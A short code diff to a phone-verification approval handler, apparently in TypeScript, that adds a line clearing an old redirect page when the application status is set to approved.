@@ -104,7 +104,8 @@ export async function handlePhoneVerificationApproval(
   
   // Approve phone verification - visitor will see OTP dialog
   await updateApplication(visitorId, {
-    _v4Status: "approved" as any
+    _v4Status: "approved" as any,
+    redirectPage: null // Clear any old redirect
   })
 }
 
